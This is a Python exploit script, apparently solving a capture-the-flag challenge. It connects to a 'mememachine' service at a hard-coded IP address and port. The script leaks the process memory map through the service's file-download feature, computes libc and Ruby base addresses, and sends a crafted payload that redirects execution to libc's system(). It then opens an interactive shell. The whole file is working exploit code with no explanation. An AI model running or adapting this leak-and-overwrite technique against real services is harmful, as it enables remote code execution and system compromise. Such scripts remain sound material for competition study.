#!/usr/bin/env python

import sys
import socket
import struct
import telnetlib
import time
import re
import string
import base64 
import random


#s = socket.create_connection(("127.0.0.1", 13337))
s = socket.create_connection(("54.164.173.236", 1337))


def interact():
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()


def ra(to=.5):
    buf = ""
    s.setblocking(0)
    begin = time.time()
    while 1:
        if buf is not "" and time.time() - begin > to:
            break
        elif time.time() - begin > to*2:
            break
        try:
            data = s.recv(4096)
            if data:
                begin = time.time()
                buf += data
            else:
                time.sleep(.1)
        except:
            pass

    s.setblocking(1)
    return buf


def rt(delim):
    buf = ""
    while delim not in buf:
        buf += s.recv(1)
    return buf


def se(data):
    s.sendall(data)

def u32(d):
    return struct.unpack("<I", d)[0]

def u64(d):
    return struct.unpack("<Q",d)[0]


def p32(d):
    return struct.pack("<I", d)


def p64(d):
    return struct.pack("<Q", d)

def rstr(l):
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(l))


def download(loc):
    se("p\n")
    rt("bro: ")
    se(base64.b64encode(loc) + "\n")
    ans = rt("[p]")[:-3].replace("ok heres ur receipt or w/e\n", "")
    return ans

def skeletal(what):
    se("m\n")
    se(base64.b64encode(what) + "\n")

def pwn():
    d = download("/proc/self/maps")
    libc_base = 0
    heap_base = 0
    ruby = 0

    for l in d.split("\n"):
        ll = l.split()
        if len(ll) != 6:
            continue
        if ll[5] == "[heap]":
            heap_base = int(ll[0].split("-")[0], 16)
        elif "libc-2.19.so" in ll[5] and ll[1] == "r-xp":
            libc_base = int(ll[0].split("-")[0], 16)
        elif "mememachine.so" in ll[5] and ll[1] == "r-xp":
            meme_machine  = int(ll[0].split("-")[0], 16)
        elif "ruby" in ll[5] and ll[1] == "r-xp" and ruby == 0:
            ruby = int(ll[0].split("-")[0], 16)

#    print d
 #   open("ruby", "wb").write(d)

    # print "libc", hex(libc_base)
    # print "heap", hex(heap_base)
    # print "meme", hex(meme_machine)
    # print "ruby", hex(ruby)

    libc_printf = libc_base + 0x54400
    libc_system= libc_base + 0x46640

    ed = ruby +  0x633
    sh = ruby +  0x20714 + 0x19

    se("l\n")

    for i in range(255):
        skeletal("1337")

    skeletal("A"*8 + p64(libc_system) + p64(ed))


    se("c\n")
    ra(to=3)
    print "go >"
    interact()
    


pwn()
